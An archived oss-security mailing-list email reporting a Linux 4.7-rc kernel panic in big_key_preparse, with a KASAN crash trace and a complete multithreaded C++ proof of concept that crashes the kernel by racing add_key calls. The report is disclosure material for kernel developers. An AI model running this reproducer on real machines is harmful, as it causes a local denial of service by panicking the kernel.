X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5693" "Friday" "22" "July" "2016" "22:54:09" "+0800" "zer0mem@yahoo.com" "zer0mem@yahoo.com" "<517068.13990.bm@smtp211.mail.bf1.yahoo.com>" "225" "[oss-security] panic at big_key_preparse #4.7-r6/rc7 & master" nil nil nil "7" "2016072214:54:09" "[oss-security] panic at big_key_preparse #4.7-r6/rc7 & master" (number mark "U       zer0mem@yaho Jul 22  225/5693  " thread-indent "\"[oss-security] panic at big_key_preparse #4.7-r6/rc7 & master\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 18176 invoked by uid 550); 22 Jul 2016 15:19:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 8143 invoked from network); 22 Jul 2016 14:57:15 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.com; s=s2048; t=1469199422; bh=loJNNeuc3aywUgqWQR7x5rOCJAI5ILJDtNI+gBW0eoM=; h=To:Cc:From:Subject:Date:From:Subject; b=XFgaGLcyYZaOIaih1JJeq5/HVK7AQivBtBZec5NEmKqV9J+noT7pag0trwFnnK0x69LIEsX0AZz0z+w+KKllJvrxP6QWhAHMJarG+BTof9HVqrm95C4JAc7TaeM0Qb8xJw7t/IwoI5THr8ryCaVBmb7i4rSNkFaDXKgzcmNPkRJ20dHBHRh1PXaRQ7nJqzJgtodK+zOGC03QLf7pdnCAMrUkJtV8N6fy7VZHnWTnaoh65kULzYPLnRbYtZlz8+1wf06n9S/DaMgKBQ7By7jnLdeEzA+xrJae+rjs1qbFiaDHeGuHGNyy/gJzdSF+4FdGRhbCjJsd5PVyEWKX+agfdQ==
X-Yahoo-Newman-Id: 517068.13990.bm@smtp211.mail.bf1.yahoo.com
Message-ID: <517068.13990.bm@smtp211.mail.bf1.yahoo.com>
X-Yahoo-Newman-Property: ymail-4
X-YMail-OSG: qJBzarYVM1mLYWkS653bRoFS6i9d1qG8PE830N4V1Ta3uor
 XaccbRhJU7A..XjEa6SestbltVCytQFGbIN8mqpYgeOGha8HU9UF9vSlT1mh
 zBfji4ydFkhwRSDSdxEC3pFvu_10O9f.cX3t.xIpufMhwyeMRXkhJpWkvMrd
 gACS9gFoDW_Ty24x6.IcKtlub60XeuO8jRpIZXhmLQDNBHsYkM9yHN6HgaY1
 vqUTes2n46ZX3ULuUxtnhCpKEvIr.ZfcX4ufI7lUhdqsdBNuVtuMGQIphD9X
 HmvS3u.umcSWCWdjySxniqiYUwnbTC3tSzpl3xsUPTM0g.mij6cGO30HwZWi
 V0OChTTmSGAhCyGfAi7LuqOiZIR43VeOZG7wdKwL5ACtOp2xtw6dJ.IIAXNp
 0Difzh8j5kCpqnTNH50G1zOFfG4SLHJ2G18zzUZ9qWNCh6mXsKN6HKtOOnGS
 sRhPbcZDgAJEVHMVc7gUe9Vvb4Sf6tIQKEX2aRs3HKLEFoFgs1Tt16Gq9hgQ
 lmXIkO_xKLTuvFUOYZ7NsA3hjoLKn67Z7._B_AlvmY8VBR3rhpOlLgiPnino
 kxXD_R5oGi7Nqkx..rIc-
X-Yahoo-SMTP: YJTpykmswBBdev0MMuiq2reCDLY-
MIME-Version: 1.0
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Cc: "cve-assign@mitre.org" <cve-assign@mitre.org>, 
	Marco Grassi <marco.gra@gmail.com>
From: <zer0mem@yahoo.com>
Date: Fri, 22 Jul 2016 22:54:09 +0800
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
	boundary="_DC4A3927-83AE-46B0-AA1F-92CFF7CF7616_"
Subject: [oss-security] panic at big_key_preparse #4.7-r6/rc7 & master

--_DC4A3927-83AE-46B0-AA1F-92CFF7CF7616_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Hi,

Following code will panic 4.7-rc6/rc7 & master

However will not panic at latest stable 4.6.4 kernel apparently


qemu + kasan

=E2=80=9C=E2=80=9D=E2=80=9D

/*

author : @zer0mem

Qilin : v3.2 [ linux ]
Reproducer : v1.0

KASAN : active
KTSAN : non-active

Linux Kernel version : 4.7

compile : clang++-3.8 -std=3Dc++1y poc.cpp -lpthread -o big_key_poc

issue : add_key -> "big_key"

[94011.624218] kasan: CONFIG_KASAN_INLINE enabled
[94011.624507] kasan: GPF could be caused by NULL-ptr deref or user memory =
access
[94011.624930] general protection fault: 0000 [#1] SMP KASAN
[94011.625234] Modules linked in:
[94011.625421] CPU: 0 PID: 13245 Comm: a.out Tainted: G    B           4.7.=
0-rc6+ #9
[94011.625837] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS =
Ubuntu-1.8.2-1ubuntu1 04/01/2014
[94011.626363] task: ffff880013b1d580 ti: ffff8800693d8000 task.ti: ffff880=
0693d8000
[94011.626778] RIP: 0010:[<ffffffff819e6e64>]  [<ffffffff819e6e64>] big_key=
_preparse+0x1a4/0x540
[94011.627262] RSP: 0018:ffff8800693dfc90  EFLAGS: 00010206
[94011.627559] RAX: dffffc0000000000 RBX: ffff8800693dfdc8 RCX: 00000000000=
00000
[94011.627956] RDX: 0000000000000009 RSI: 0000000000000000 RDI: 00000000000=
00048
[94011.628356] RBP: ffff8800693dfcc8 R08: ffffed000d27bfc2 R09: ffff8800693=
dfdc8
[94011.628752] R10: ffff8800693dfe0f R11: ffffed000d27bfc2 R12: 00000000000=
00000
[94011.629149] R13: 0000000000000f50 R14: ffff8800693dfe48 R15: ffff8800693=
dfdf0
[94011.629547] FS:  00007faf577fe700(0000) GS:ffff88006d200000(0000) knlGS:=
0000000000000000
[94011.629994] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[94011.630361] CR2: 0000000000609000 CR3: 000000006a9bd000 CR4: 00000000000=
006f0
[94011.630812] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 00000000000=
00000
[94011.631223] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 00000000000=
00400
[94011.631633] Stack:
[94011.631755]  ffff8800693dfdc8 0000000000000048 ffffffff819e6cc0 1ffff100=
0d27bfa5
[94011.632349]  ffffffffffffffec ffff8800693dfe48 ffff88005098b400 ffff8800=
693dfe70
[94011.633063]  ffffffff819d5a81 0000000000000004 ffff8800693dfd30 ffff8800=
693dfdc8
[94011.633550] Call Trace:
[94011.633702]  [<ffffffff819e6cc0>] ? big_key_crypt+0x2a0/0x2a0
[94011.634034]  [<ffffffff819d5a81>] key_create_or_update+0x361/0xa00
[94011.634389]  [<ffffffff819d5720>] ? key_type_lookup+0xe0/0xe0
[94011.634719]  [<ffffffff815c3609>] ? ___slab_alloc+0x179/0x4c0
[94011.635050]  [<ffffffff815c5643>] ? __kmalloc+0x103/0x250
[94011.635360]  [<ffffffff819da6e4>] SyS_add_key+0x1f4/0x390
[94011.635671]  [<ffffffff819da4f0>] ? key_get_type_from_user.constprop.8+0=
xe0/0xe0
[94011.636106]  [<ffffffff81083d40>] ? compat_start_thread+0x90/0x90
[94011.636457]  [<ffffffff82d36af6>] entry_SYSCALL_64_fastpath+0x1e/0xa8
[94011.636823] Code: 5c 41 5d 41 5e 41 5f 5d c3 e8 89 f1 98 ff 4c 8b 25 32 =
cb 47 02 48 b8 00 00 00 00 00 fc ff df 49 8d 7c 24 48 48 89 fa 48 c1 ea 03 =
<80> 3c 02 00 0f 85 78 03 00 00 4d 8b 64 24 48 48 b8 00 00 00 00=20
[94011.638412] RIP  [<ffffffff819e6e64>] big_key_preparse+0x1a4/0x540
[94011.638775]  RSP <ffff8800693dfc90>
[94011.639205] ---[ end trace 0255e2496c208fbf ]---
[94011.639474] Kernel panic - not syncing: Fatal exception
[94011.639855] Kernel Offset: disabled
[94011.640066] ---[ end Kernel panic - not syncing: Fatal exception

*/

#include <stdint.h>

#include <memory>
#include <algorithm>
#include <functional>
#include <string>
#include <atomic>
#include <stdlib.h>
#include <vector>
#include <stdlib.h>
#include <stdio.h>

#include <thread>

#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <fcntl.h>

#include <keyutils.h>

int handles[0x10] =3D { 0 };
char buffer[0x1000] =3D { 0 };

bool rand01() { return std::rand() % 2; }

void shaka()
{
	for (size_t i =3D 0; i < sizeof(buffer); ++i)
		buffer[i] =3D std::rand() % 0xFF;

	while (true)
	{
		for (size_t i =3D std::rand() % sizeof(buffer); i < sizeof(buffer); ++i)
			buffer[i] =3D std::rand() % 0xFF;

		sleep(std::rand() % 10);
	}
}

void workers(int fd)
{
	size_t max_round =3D 40 + std::rand() % 200;
	for (size_t i =3D 0; i < max_round; i++)
	{
		switch(std::rand() % 1)
		{
			case 0 :
			{
				add_key(
					rand01() ? "user" : "big_key",
					0,
					buffer,
					std::rand() % sizeof(buffer),
					handles[std::rand() % 0x10]);

			} break;

			default:
				break;
		}=09=09
	}
}

void ctors(int ind)
{
	handles[ind] =3D 0;
	while (!handles[ind])
	{
		switch(std::rand() % 1)
		{
			case 0 :
			{
				handles[ind] =3D add_key(
					rand01() ? "user" : "big_key",
					0,
					buffer,
					std::rand() % sizeof(buffer),
					handles[std::rand() % 0x10]);
			} break;

			default:
				break;
		}
	}
	int fd =3D handles[ind];
	for (size_t i =3D 0; i < 20; ++i, sleep(1 + std::rand() % 4))
		for (size_t j =3D std::rand() % 4; j; --j)
			workers(fd);
}

int main()
{
	std::thread(shaka).detach();
	for (;; sleep(std::rand() % 4))
		std::thread([]()
			{
			for (size_t i =3D 0; i < 0x10; ++i)
				std::thread(ctors, i).detach();=09=09
			}).detach();
=09
	return 0;
};

#include <asm/unistd.h>

#define __weak __attribute__((weak))

key_serial_t __weak add_key(const char *type,
			    const char *description,
			    const void *payload,
			    size_t plen,
			    key_serial_t ringid)
{
	return syscall(__NR_add_key,
		       type, description, payload, plen, ringid);
}


=E2=80=9C=E2=80=9D=E2=80=9D

Peter

Sent from Mail for Windows 10


--_DC4A3927-83AE-46B0-AA1F-92CFF7CF7616_--

